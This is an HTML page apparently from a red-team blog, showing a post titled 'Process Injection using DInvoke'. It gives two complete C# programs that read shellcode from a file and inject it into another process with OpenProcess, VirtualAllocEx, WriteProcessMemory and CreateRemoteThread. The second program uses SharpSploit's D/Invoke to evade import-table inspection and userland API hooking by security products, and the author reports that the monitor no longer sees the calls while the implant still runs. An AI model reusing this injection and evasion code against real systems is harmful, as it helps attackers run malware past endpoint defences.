@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">Process Injection using DInvoke</h1>
+    
+      
+    <nav id="TableOfContents"></nav>
+    <h1 id="introduction">Introduction</h1>
+<p>Back in June, I <a href="https://offensivedefence.co.uk/posts/sharpsploit-16/">posted</a> a short update on my shared blog regarding the SharpSploit v1.6 release.  Within that post I mentioned Dynamic Invocation, which is a new feature introduced by <a href="https://twitter.com/TheRealWover">TheWover</a> and <a href="https://twitter.com/FuzzySec">b33f</a>.  It wasn&rsquo;t the focus of my post so I didn&rsquo;t go into any details, but TheWover already <a href="https://thewover.github.io/Dynamic-Invoke/">published</a> some information about what DInvoke is and how to use it.</p>
+<p>I obviously won&rsquo;t reiterate everything written there, but here&rsquo;s a quick recap:</p>
+<p>Platform Invoke (P/Invoke) allows you to access methods within unmanaged libraries from managed code.  In other words for us attackers - load and use native DLLs from .NET assemblies.  Those that have used or written offensive tooling in C# (particularly for process injection) have seen this numerous times.</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="na">[DllImport(&#34;kernel32.dll&#34;)]</span>
+<span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="kt">int</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwProcessId</span><span class="p">);</span>
+</code></pre></div><p>First we define a <code>DllImport</code> attribute, providing the DLL that contains the method we want.  Then provide the &ldquo;signature&rdquo; of that method, which defines what parameters it expects to take in and what it should return.  These need to be &ldquo;translated&rdquo; from the native <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">documentation</a>, e.g. instead of a <code>HANDLE</code> in C, we use an <code>Intptr</code> in C#.  Thereafter, we can just call this method from with our C#:  <code>IntPtr hProcess = OpenProcess(0x001F0FFF, false, int.Parse(args[1]));</code>  (where <code>0x001F0FFF</code> equates to <code>PROCESS_ALL_ACCESS</code>).</p>
+<p>The .NET runtime actually uses P/Invoke by design and namespaces like <code>System.Diagnostics</code> rely on <code>OpenProcess</code> under the hood.  For instance, <code>IntPtr hProcess = Process.GetProcessById(x)</code> also gives us handle to the process, but the API calls have harded parameters such as <code>PROCESS_QUERY_INFORMATION</code>.  So although we have a handle, it may not be of sufficient privilege and other API calls may not be exposed via the framework at all.  This is why manually P/Invoking is necessary to access these APIs directly.</p>
+<p>However, as TheWover explains, there are two disadvantages to using P/Invoke in this way:</p>
+<ol>
+<li>Any reference to a Windows API call made through P/Invoke will result in a corresponding entry in the .NET assembly&rsquo;s Import Table.</li>
+<li>Any endpoint security product running on the target machine that is monitoring API calls (such as via API Hooking), will see/block/alert on any API calls made via P/Invoke.</li>
+</ol>
+<p>The aim of D/Invoke is to provide an alternate means of accessing these native Windows APIs without leaving these particular indicators behind (that&rsquo;s not to say D/Invoke doesn&rsquo;t have indicators of its own).</p>
+<p>The OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread is the easiest and simplest process injection technique that I know, and served as a test case for &ldquo;translating&rdquo; from P/Invoke to D/Invoke.  I also re-implemented b33f&rsquo;s <a href="https://github.com/FuzzySecurity/Sharp-Suite/tree/master/UrbanBishop">UrbanBishop</a> project, but that would make for a much more complicated blog post :)</p>
+<h1 id="create-remote-thread-pinvoke">Create Remote Thread [P/Invoke]</h1>
+<p>A typical example of this technique could look like this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">InjectionTest</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="kt">var</span> <span class="n">shellcode</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+
+            <span class="kt">var</span> <span class="n">hProcess</span> <span class="p">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="m">0</span><span class="n">x001F0FFF</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="kt">int</span><span class="p">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">1</span><span class="p">]));</span>
+            <span class="kt">var</span> <span class="n">alloc</span> <span class="p">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0</span><span class="n">x1000</span> <span class="p">|</span> <span class="m">0</span><span class="n">x2000</span><span class="p">,</span> <span class="m">0</span><span class="n">x40</span><span class="p">);</span>
+
+            <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">alloc</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">out</span> <span class="n">UIntPtr</span> <span class="n">bytesWritten</span><span class="p">);</span>
+            <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">alloc</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="na">
+</span><span class="na">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+        <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="kt">int</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwProcessId</span><span class="p">);</span>
+<span class="na">
+</span><span class="na">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+        <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwSize</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flProtect</span><span class="p">);</span>
+<span class="na">
+</span><span class="na">        [DllImport(&#34;kernel32.dll&#34;, SetLastError = true)]</span>
+        <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">nSize</span><span class="p">,</span> <span class="k">out</span> <span class="n">UIntPtr</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>
+<span class="na">
+</span><span class="na">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+        <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadId</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>If we use <a href="http://www.rohitab.com/apimonitor">API Monitor</a> as our would-be EDR, set hooks on these API calls and execute InjectionTest.exe, we can see how it picks up the details of our calls.</p>
+<figure>
+    <img src="/images/dinvoke/WriteProcessMemory.png"/> 
+</figure>
+
+<p>API Monitor restores execution flow, but an EDR would obviously not be that considerate.  Some EDRs may outright block access to these APIs, or at least will be able to inspect the calls (and even see the shellcode) before making some sort of decision for blocking.  So let&rsquo;s replace P/Invoke for D/Invoke - the process is not as hard as you expect.</p>
+<p>The first step is to add SharpSploit as a reference for the Visual Studio Project.  Then we need to replace the <code>DllImport</code> attributes with <code>UnmanagedFunctionPointer</code> declerations, and change <code>static extern</code> for <code>delegate</code>.  The heart of D/Invoke works by &ldquo;manually&rdquo; mapping a DLL into the current process and getting a pointer to the desired method.  Some delegate magic is then used to wrap that within something we can execute.</p>
+<p><code>OpenProcess</code> for example, would become:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="na">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+<span class="k">delegate</span> <span class="n">IntPtr</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="kt">int</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwProcessId</span><span class="p">);</span>
+</code></pre></div><p>The rest of the method signature remains the same.</p>
+<p>Get a pointer to <code>OpenProcess</code> with: <code>var pointer = Generic.GetLibraryAddress(&quot;kernel32.dll&quot;, &quot;OpenProcess&quot;);</code>.</p>
+<p>Next, use <code>GetDelegateForFunctionPointer</code> to map this pointer to the delegate we made: <code>var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpenProcess)) as OpenProcess;</code>.</p>
+<p>And finally <code>var hProcess = openProcess(0x001F0FFF, false, int.Parse(args[1]));</code>.</p>
+<h1 id="create-remote-thread-dinvoke">Create Remote Thread [D/Invoke]</h1>
+<p>The complete code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+
+<span class="k">using</span> <span class="nn">SharpSploit.Execution.DynamicInvoke</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">InjectionTest</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="kt">var</span> <span class="n">shellcode</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+
+            <span class="kt">var</span> <span class="n">pointer</span> <span class="p">=</span> <span class="n">Generic</span><span class="p">.</span><span class="n">GetLibraryAddress</span><span class="p">(</span><span class="s">&#34;kernel32.dll&#34;</span><span class="p">,</span> <span class="s">&#34;OpenProcess&#34;</span><span class="p">);</span>
+            <span class="kt">var</span> <span class="n">openProcess</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="n">pointer</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">OpenProcess</span><span class="p">))</span> <span class="k">as</span> <span class="n">OpenProcess</span><span class="p">;</span>
+            <span class="kt">var</span> <span class="n">hProcess</span> <span class="p">=</span> <span class="n">openProcess</span><span class="p">(</span><span class="m">0</span><span class="n">x001F0FFF</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="kt">int</span><span class="p">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">1</span><span class="p">]));</span>
+
+            <span class="n">pointer</span> <span class="p">=</span> <span class="n">Generic</span><span class="p">.</span><span class="n">GetLibraryAddress</span><span class="p">(</span><span class="s">&#34;kernel32.dll&#34;</span><span class="p">,</span> <span class="s">&#34;VirtualAllocEx&#34;</span><span class="p">);</span>
+            <span class="kt">var</span> <span class="n">virtualAllocEx</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="n">pointer</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">VirtualAllocEx</span><span class="p">))</span> <span class="k">as</span> <span class="n">VirtualAllocEx</span><span class="p">;</span>
+            <span class="kt">var</span> <span class="n">alloc</span> <span class="p">=</span> <span class="n">virtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0</span><span class="n">x1000</span> <span class="p">|</span> <span class="m">0</span><span class="n">x2000</span><span class="p">,</span> <span class="m">0</span><span class="n">x40</span><span class="p">);</span>
+
+            <span class="n">pointer</span> <span class="p">=</span> <span class="n">Generic</span><span class="p">.</span><span class="n">GetLibraryAddress</span><span class="p">(</span><span class="s">&#34;kernel32.dll&#34;</span><span class="p">,</span> <span class="s">&#34;WriteProcessMemory&#34;</span><span class="p">);</span>
+            <span class="kt">var</span> <span class="n">writeProcessMemory</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="n">pointer</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">WriteProcessMemory</span><span class="p">))</span> <span class="k">as</span> <span class="n">WriteProcessMemory</span><span class="p">;</span>
+            <span class="n">writeProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">alloc</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">out</span> <span class="n">UIntPtr</span> <span class="n">bytesWritten</span><span class="p">);</span>
+
+            <span class="n">pointer</span> <span class="p">=</span> <span class="n">Generic</span><span class="p">.</span><span class="n">GetLibraryAddress</span><span class="p">(</span><span class="s">&#34;kernel32.dll&#34;</span><span class="p">,</span> <span class="s">&#34;CreateRemoteThread&#34;</span><span class="p">);</span>
+            <span class="kt">var</span> <span class="n">createRemoteThread</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="n">pointer</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">CreateRemoteThread</span><span class="p">))</span> <span class="k">as</span> <span class="n">CreateRemoteThread</span><span class="p">;</span>
+            <span class="n">createRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">alloc</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="na">
+</span><span class="na">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+        <span class="k">delegate</span> <span class="n">IntPtr</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="kt">int</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwProcessId</span><span class="p">);</span>
+<span class="na">
+</span><span class="na">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+        <span class="k">public</span> <span class="k">delegate</span> <span class="n">IntPtr</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwSize</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flProtect</span><span class="p">);</span>
+<span class="na">
+</span><span class="na">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">bool</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">nSize</span><span class="p">,</span> <span class="k">out</span> <span class="n">UIntPtr</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>
+<span class="na">
+</span><span class="na">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+        <span class="k">public</span> <span class="k">delegate</span> <span class="n">IntPtr</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadId</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>As we can see - with the same hooks in place, API Monitor no longer sees our API calls and we still get our Beacon.</p>
+<figure>
+    <img src="/images/dinvoke/Beacon.png"/> 
+</figure>
+
+<h1 id="conclusion">Conclusion</h1>
+<p>Just like P/Invoke, D/Invoke allows us to import and use native APIs but in a way that avoids entries in the import table and some userland API hooking.  Without a significant amount of development work, we can port existing P/Invoke to D/Invoke to breath new life into old code.  In addition to <code>GetLibraryAddress</code>, the D/Invoke API provides other means for mapping DLLs either from disk or memory.  I look forward to exploring the various ways D/Invoke can improve covert tradecraft.</p>
+<p>I hope this short primer will encourage those who find the idea of D/Invoke a bit daunting to give it a go.</p>
+<p>Shoutout to both TheWover and b33f for their hard work in this area.</p>
+
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/sharpc2/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a class="grayed-out" href="javascript:void()"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
